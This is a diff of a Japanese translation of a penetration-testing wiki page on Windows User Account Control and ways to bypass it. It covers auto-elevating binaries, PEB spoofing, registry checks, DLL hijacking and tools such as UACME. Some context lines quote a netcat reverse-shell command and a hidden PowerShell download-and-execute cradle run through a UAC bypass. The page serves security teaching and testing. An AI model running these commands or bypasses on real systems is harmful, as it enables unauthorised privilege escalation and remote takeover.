@@ -4,9 +4,9 @@
 
 ## UAC
 
-[ユーザーアカウント制御 (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) は、**昇格された活動のための同意プロンプト**を有効にする機能です。アプリケーションには異なる `integrity` レベルがあり、**高いレベル**のプログラムは、**システムを危険にさらす可能性のあるタスク**を実行できます。UACが有効になっている場合、アプリケーションやタスクは常に**非管理者アカウントのセキュリティコンテキストで実行され**、管理者が明示的にこれらのアプリケーション/タスクに管理者レベルのアクセスを許可しない限り、システムを実行することはできません。これは、管理者が意図しない変更から保護される便利な機能ですが、セキュリティ境界とは見なされません。
+[ユーザーアカウント制御 (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) は、**昇格された活動のための同意プロンプト**を有効にする機能です。アプリケーションには異なる `integrity` レベルがあり、**高いレベル**のプログラムは、**システムを危険にさらす可能性のあるタスク**を実行できます。UACが有効になっている場合、アプリケーションやタスクは常に**非管理者アカウントのセキュリティコンテキストの下で実行され**、管理者が明示的にこれらのアプリケーション/タスクにシステムへの管理者レベルのアクセスを許可しない限り、実行されません。これは、管理者が意図しない変更から保護される便利な機能ですが、セキュリティ境界とは見なされません。
 
-インテグリティレベルに関する詳細情報については：
+インテグリティレベルに関する詳細情報は以下を参照してください：
 
 {{#ref}}
 ../windows-local-privilege-escalation/integrity-levels.md
@@ -31,22 +31,28 @@ UACが有効な場合、管理者ユーザーには2つのトークンが与え�
 
 ### UACバイパス理論
 
-一部のプログラムは、**ユーザーが** **管理者グループに属している**場合に**自動的に昇格**されます。これらのバイナリには、_**Manifests**_ 内に _**autoElevate**_ オプションが _**True**_ の値で含まれています。バイナリは、**Microsoftによって署名されている**必要があります。
+一部のプログラムは、**ユーザーが** **管理者グループに属している場合**に**自動的に昇格**されます。これらのバイナリは、_**Manifests**_ 内に _**autoElevate**_ オプションを _**True**_ の値で持っています。バイナリは**Microsoftによって署名されている必要があります**。
 
-次に、**UAC**を**バイパス**するために（**中**のインテグリティレベルから**高**に昇格する）、一部の攻撃者はこの種のバイナリを使用して**任意のコードを実行**します。なぜなら、それは**高いインテグリティプロセス**から実行されるからです。
+多くの自動昇格プロセスは、**COMオブジェクトやRPCサーバーを介して機能を公開**しており、これは中程度のインテグリティ（通常のユーザーレベルの権限）で実行されているプロセスから呼び出すことができます。COM（コンポーネントオブジェクトモデル）とRPC（リモートプロシージャコール）は、Windowsプログラムが異なるプロセス間で通信し、関数を実行するために使用する方法です。例えば、**`IFileOperation COMオブジェクト`**はファイル操作（コピー、削除、移動）を処理するために設計されており、プロンプトなしで自動的に権限を昇格させることができます。
 
-バイナリの_**Manifest**_を確認するには、Sysinternalsのツール_**sigcheck.exe**_を使用できます。また、_Process Explorer_や_SysinternalsのProcess Monitor_を使用してプロセスの**インテグリティレベル**を確認できます。
+一部のチェックが行われる場合があります。例えば、プロセスが**System32ディレクトリ**から実行されたかどうかを確認することですが、これは**explorer.exe**や他のSystem32にある実行可能ファイルに注入することでバイパスできます。
+
+これらのチェックをバイパスする別の方法は、**PEBを変更する**ことです。Windowsのすべてのプロセスにはプロセス環境ブロック（PEB）があり、プロセスに関する重要なデータ（実行可能ファイルのパスなど）が含まれています。PEBを変更することで、攻撃者は自分の悪意のあるプロセスの場所を偽装（スプーフィング）し、信頼されたディレクトリ（例えばsystem32）から実行されているように見せることができます。このスプーフィングされた情報は、COMオブジェクトを騙してプロンプトなしで権限を自動的に昇格させます。
+
+次に、**UACをバイパス**（**中程度**のインテグリティレベルから**高い**に昇格）するために、一部の攻撃者はこの種のバイナリを使用して**任意のコードを実行**します。なぜなら、それは**高いレベルのインテグリティプロセス**から実行されるからです。
+
+バイナリの_**Manifest**_を確認するには、Sysinternalsのツール_**sigcheck.exe**_を使用します。(`sigcheck.exe -m <file>`) また、_Process Explorer_や_SysinternalsのProcess Monitor_を使用してプロセスの**インテグリティレベル**を確認できます。
 
 ### UACの確認
 
-UACが有効かどうかを確認するには、次の操作を行います：
+UACが有効かどうかを確認するには、次のようにします：
 ```
 REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
 
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
 EnableLUA    REG_DWORD    0x1
 ```
-もしそれが **`1`** であれば、UACは **有効** です。もしそれが **`0`** であるか、**存在しない** のであれば、UACは **無効** です。
+もしそれが**`1`**であれば、UACは**有効**です。もし**`0`**であるか、**存在しない**場合、UACは**無効**です。
 
 次に、**どのレベル**が設定されているかを確認します：
 ```
@@ -63,17 +69,17 @@ ConsentPromptBehaviorAdmin    REG_DWORD    0x5
 - **`5`** の場合（**デフォルト**）、非Windowsバイナリを高い権限で実行するために管理者に確認を求めます
 
 次に、**`LocalAccountTokenFilterPolicy`** の値を確認する必要があります。\
-値が **`0`** の場合、**RID 500** ユーザー（**組み込みの管理者**）のみがUACなしで**管理タスク**を実行できます。値が `1` の場合、**「Administrators」** グループ内のすべてのアカウントがそれを実行できます。
+値が**`0`**の場合、**RID 500** ユーザー（**ビルトイン管理者**）のみがUACなしで**管理タスク**を実行できます。`1`の場合、**「Administrators」** グループ内のすべてのアカウントがそれを実行できます。
 
-最後に、キー **`FilterAdministratorToken`** の値を確認します。\
-**`0`**（デフォルト）の場合、**組み込みの管理者アカウントは**リモート管理タスクを実行できます。**`1`** の場合、組み込みの管理者アカウントはリモート管理タスクを実行できませんが、`LocalAccountTokenFilterPolicy` が `1` に設定されている場合を除きます。
+最後に、キー **`FilterAdministratorToken`** の値を確認してください。\
+**`0`**（デフォルト）の場合、**ビルトイン管理者アカウントは**リモート管理タスクを実行できます。`1`の場合、ビルトイン管理者アカウントは**リモート管理タスクを実行できません**が、`LocalAccountTokenFilterPolicy` が `1` に設定されている場合を除きます。
 
 #### 概要
 
 - `EnableLUA=0` または **存在しない**場合、**誰に対してもUACなし**
 - `EnableLua=1` かつ **`LocalAccountTokenFilterPolicy=1`** の場合、誰に対してもUACなし
-- `EnableLua=1` かつ **`LocalAccountTokenFilterPolicy=0`** かつ **`FilterAdministratorToken=0`** の場合、RID 500（組み込みの管理者）に対してUACなし
-- `EnableLua=1` かつ **`LocalAccountTokenFilterPolicy=0`** かつ **`FilterAdministratorToken=1`** の場合、全員に対してUACあり
+- `EnableLua=1` かつ **`LocalAccountTokenFilterPolicy=0`** かつ `FilterAdministratorToken=0` の場合、RID 500（ビルトイン管理者）に対してUACなし
+- `EnableLua=1` かつ **`LocalAccountTokenFilterPolicy=0`** かつ `FilterAdministratorToken=1` の場合、全員に対してUACあり
 
 このすべての情報は、**metasploit** モジュール `post/windows/gather/win_privs` を使用して収集できます。
 
@@ -84,16 +90,16 @@ whoami /groups | findstr Level
 ```
 ## UACバイパス
 
-> [!NOTE]
+> [!TIP]
 > 被害者にグラフィカルアクセスがある場合、UACバイパスは簡単で、UACプロンプトが表示されたときに「はい」をクリックするだけです。
 
 UACバイパスは以下の状況で必要です: **UACが有効で、プロセスが中程度の整合性コンテキストで実行されており、ユーザーが管理者グループに属している場合**。
 
-UACが**最高のセキュリティレベル（常に）**に設定されている場合、他のレベル（デフォルト）の場合よりもUACをバイパスするのが**はるかに難しい**ことを言及することが重要です。
+UACが最高のセキュリティレベル（常に）に設定されている場合、他のレベル（デフォルト）の場合よりも**UACをバイパスするのははるかに難しい**ことを言及することが重要です。
 
 ### UAC無効
 
-UACがすでに無効になっている場合（`ConsentPromptBehaviorAdmin`が**`0`**）、**管理者権限でリバースシェルを実行する**ことができます（高整合性レベル）次のようなものを使用して:
+UACがすでに無効になっている場合（`ConsentPromptBehaviorAdmin`が**`0`**）、**管理者権限でリバースシェルを実行することができます**（高整合性レベル）次のようなものを使用して:
 ```bash
 #Put your reverse shell instead of "calc.exe"
 Start-Process powershell -Verb runAs "calc.exe"
@@ -106,7 +112,7 @@ Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10
 
 ### **非常に** 基本的なUAC "バイパス"（フルファイルシステムアクセス）
 
-管理者グループに属するユーザーのシェルを持っている場合、**C$** 共有をSMB（ファイルシステム）経由で新しいディスクにマウントすることができ、**ファイルシステム内のすべてにアクセスできます**（管理者のホームフォルダも含む）。
+管理者グループに属するユーザーのシェルがある場合、**C$** 共有をSMB（ファイルシステム）経由で新しいディスクにマウントすることで、**ファイルシステム内のすべてにアクセスできます**（管理者のホームフォルダも含む）。
 
 > [!WARNING]
 > **このトリックはもう機能していないようです**
@@ -139,10 +145,10 @@ runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.w
 
 ### UAC バイパスエクスプロイト
 
-[**UACME**](https://github.com/hfiref0x/UACME) は、いくつかの UAC バイパスエクスプロイトの **コンパイル** です。**UACME を Visual Studio または msbuild を使用してコンパイルする必要があります**。コンパイルにより、いくつかの実行可能ファイル（例: `Source\Akagi\outout\x64\Debug\Akagi.exe`）が作成されます。**どれが必要かを知っておく必要があります。**\
-**注意が必要** です。なぜなら、いくつかのバイパスは **他のプログラムを促す** ことがあり、**ユーザー** に何かが起こっていることを **警告** します。
+[**UACME** ](https://github.com/hfiref0x/UACME) は、いくつかの UAC バイパスエクスプロイトの **コンパイル** です。**UACME を Visual Studio または msbuild を使用してコンパイルする必要がある**ことに注意してください。コンパイルにより、いくつかの実行可能ファイル（例えば `Source\Akagi\outout\x64\Debug\Akagi.exe`）が作成されます。**どれが必要かを知っておく必要があります。**\
+**注意が必要です**。なぜなら、いくつかのバイパスは **他のプログラムを促す** ことがあり、**ユーザー** に何かが起こっていることを **警告** します。
 
-UACME には、各技術が動作し始めた **ビルドバージョン** が含まれています。あなたのバージョンに影響を与える技術を検索できます:
+UACME には、各技術が動作し始めた **ビルドバージョン** があります。あなたのバージョンに影響を与える技術を検索できます：
 ```
 PS C:\> [environment]::OSVersion.Version
 
@@ -152,9 +158,9 @@ Major  Minor  Build  Revision
 ```
 Also, using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page you get the Windows release `1607` from the build versions.
 
-#### More UAC bypass
+#### さらなるUACバイパス
 
-**すべて**の技術は、AUCをバイパスするために**フルインタラクティブシェル**を必要とします（一般的なnc.exeシェルでは不十分です）。
+**ここで使用される**すべての技術は、**完全なインタラクティブシェル**を被害者と持つことを**必要とします**（一般的なnc.exeシェルでは不十分です）。
 
 **meterpreter**セッションを使用して取得できます。**Session**値が**1**に等しい**プロセス**に移行します：
 
@@ -162,29 +168,29 @@ Also, using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) pag
 
 (_explorer.exe_ は動作するはずです)
 
-### UAC Bypass with GUI
+### GUIを使用したUACバイパス
 
-**GUIにアクセスできる場合は、UACプロンプトが表示されたときにそれを受け入れるだけで済みます。** バイパスは本当に必要ありません。したがって、GUIにアクセスすることでUACをバイパスできます。
+**GUIにアクセスできる場合、UACプロンプトが表示されたときにそれを受け入れるだけで済みます**。実際にはバイパスは必要ありません。したがって、GUIにアクセスすることでUACをバイパスできます。
 
-さらに、誰かが使用していたGUIセッション（おそらくRDP経由）を取得した場合、**管理者として実行されるツールがいくつかあり、そこから**例えば**管理者として**直接**cmd**を**実行**できることがあります。UACによって再度プロンプトされることはありません。 [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)のように。これは少し**ステルス**かもしれません。
+さらに、誰かが使用していたGUIセッション（おそらくRDP経由）を取得した場合、**管理者として実行されるいくつかのツール**があり、そこから**管理者として**直接**cmd**を**実行**できる可能性があります。再度UACによるプロンプトなしで、[**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)のように。これは少し**ステルス**になるかもしれません。
 
-### Noisy brute-force UAC bypass
+### 騒がしいブルートフォースUACバイパス
 
-騒がしくなることを気にしないのであれば、常に**[**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin)**のようなものを**実行**して、**ユーザーが受け入れるまで権限を昇格するように要求することができます**。
+騒がしいことを気にしないのであれば、常に**[**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin)**のようなものを**実行**して、**ユーザーが受け入れるまで権限を昇格するように要求することができます**。
 
-### Your own bypass - Basic UAC bypass methodology
+### 自分自身のバイパス - 基本的なUACバイパス手法
 
-**UACME**を見てみると、**ほとんどのUACバイパスはDll Hijackingの脆弱性を悪用しています**（主に悪意のあるdllを_C:\Windows\System32_に書き込むこと）。 [Dll Hijackingの脆弱性を見つける方法を学ぶにはこれを読んでください](../windows-local-privilege-escalation/dll-hijacking/index.html)。
+**UACME**を見てみると、**ほとんどのUACバイパスはDll Hijackingの脆弱性を悪用している**ことに気付くでしょう（主に悪意のあるdllを_C:\Windows\System32_に書き込むこと）。[Dll Hijackingの脆弱性を見つける方法を学ぶにはこれを読んでください](../windows-local-privilege-escalation/dll-hijacking/index.html)。
 
 1. **自動昇格**するバイナリを見つけます（実行時に高い整合性レベルで実行されることを確認します）。
-2. procmonを使用して、**DLL Hijacking**に脆弱な**"NAME NOT FOUND"**イベントを見つけます。
-3. おそらく、**書き込み権限がない**いくつかの**保護されたパス**（C:\Windows\System32など）内にDLLを**書き込む**必要があります。これをバイパスするには：
-   1. **wusa.exe**: Windows 7,8および8.1。保護されたパス内にCABファイルの内容を抽出することを許可します（このツールは高い整合性レベルから実行されるため）。
-   2. **IFileOperation**: Windows 10。
+2. procmonを使用して、**DLL Hijacking**に脆弱な"**NAME NOT FOUND**"イベントを見つけます。
+3. おそらく、**書き込み権限がない**いくつかの**保護されたパス**（C:\Windows\System32など）内にDLLを**書き込む**必要があります。これを回避するには、次の方法を使用できます：
+   1. **wusa.exe**：Windows 7、8、8.1。保護されたパス内にCABファイルの内容を抽出することを許可します（このツールは高い整合性レベルから実行されるため）。
+   2. **IFileOperation**：Windows 10。
 4. 保護されたパス内にDLLをコピーし、脆弱で自動昇格されたバイナリを実行するための**スクリプト**を準備します。
 
-### Another UAC bypass technique
+### 別のUACバイパス技術
 
-**自動昇格されたバイナリ**が**実行**される**バイナリ**または**コマンド**の**名前/パス**を**レジストリ**から**読み取ろうとする**のを監視することに基づいています（このバイナリが**HKCU**内でこの情報を検索する場合、これはより興味深いです）。
+**autoElevatedバイナリ**が**実行される**ための**バイナリ**または**コマンド**の**名前/パス**を**レジストリ**から**読み取ろうとする**のを監視することに基づいています（これは、バイナリが**HKCU**内でこの情報を検索する場合により興味深いです）。
 
 {{#include ../../banners/hacktricks-training.md}}
